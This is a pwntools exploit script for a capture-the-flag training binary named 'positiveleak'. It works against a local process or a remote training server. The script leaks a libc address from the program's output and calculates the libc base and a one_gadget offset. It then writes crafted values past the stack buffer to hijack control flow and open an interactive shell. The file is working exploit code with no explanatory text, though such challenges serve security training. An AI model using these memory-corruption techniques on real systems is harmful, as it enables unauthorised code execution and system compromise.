from pwn import *


context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    #r = process("./positiveleak", env={"LD_PRELOAD": "./libc-2.27.so"})
	r = process("./positiveleak")
	gdb.attach(r, """
	c
	""")
	input("wait")
else:
	r = remote("bin.training.jinblack.it", 3003)


def send_number(size, first_value, value):
    r.recvuntil("> ")
    r.sendline(b"0")
    r.recvuntil("How many would you add?> ")
    r.sendline(str(size))
    r.recvuntil("> ")
    r.send(first_value)
    for index in range(len(value)):
        r.recvuntil("> ")
        r.send(value[index])
        sleep(0.02)

def print_numbers():
    r.recvuntil("> ")
    r.send("1")
    values = r.recvuntil("\n*")[-2:]
    return values

def leak_address_from_print(size):
    r.recvuntil("> ")
    r.send("1")
    for index in range(size):
        r.recvuntil("0\n")
    leak = int(r.recvuntil("\n")[:-1])
    r.recvuntil("*")
    return leak

def stack_offset(size):
    temp1 = (size * 0x4) + 0x17
    temp2 = int(int(temp1 / 0x10) * 0x10)
    return temp2

LIBC = ELF("./libc-2.27.so")
payload_array = ["0","0","0","0"]
SIZE = 4
send_number(SIZE, "0", payload_array)
leak = leak_address_from_print(SIZE)
print("[!] leak: %#x" % leak) #leak is inside libc
LIBC.address = leak - 0x3ec680
print("[!] libc: %#x" % LIBC.address)
one_gadget_offset = 0x4f322 #other gadgets 0x4f2c5 0x10a38c
LIBC.one_gadget = LIBC.address + one_gadget_offset
print("[!] one_gadget: %#x" % LIBC.one_gadget)

#To solve the challenge we just need to send right values at right position now
SIZE = 150
stack_position_offset = int(stack_offset(SIZE) / 8) + 1
print("[!] stack_offset: %#x" % stack_position_offset)

ok = int(hex(stack_position_offset + 5) + "00000000", 16)

print("[!] ok: %#x" % ok)

#start sending stuff
r.recvuntil("> ")
r.send("0")
r.recvuntil("How many would you add?> ")
r.send(str(SIZE))

#Fill untill necessary
for i in range(stack_position_offset):
    r.recvuntil("> ")
    r.sendline(b"0")

#start sending payload
r.recvuntil("> ")
r.send(b"%d" % ok)

r.recvuntil("> ")
r.send(b"%d" % LIBC.one_gadget)

for i in range(9):
    r.recvuntil("> ")
    r.send("0")

r.recvuntil("> ")
r.send("-1")

r.interactive()